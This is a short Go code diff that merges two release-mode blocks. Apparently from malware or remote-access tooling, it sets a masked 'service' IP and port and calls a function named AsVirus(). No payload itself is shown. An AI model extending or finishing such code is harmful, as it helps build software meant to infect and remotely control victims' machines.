@@ -724,9 +724,6 @@ func main() {
 
 	if release {
 		service = strings.Trim("xxx.xxx.xxx.xxx:xxxxx", " ")
-	}
-
-	if release {
 		AsVirus()
 	}
 
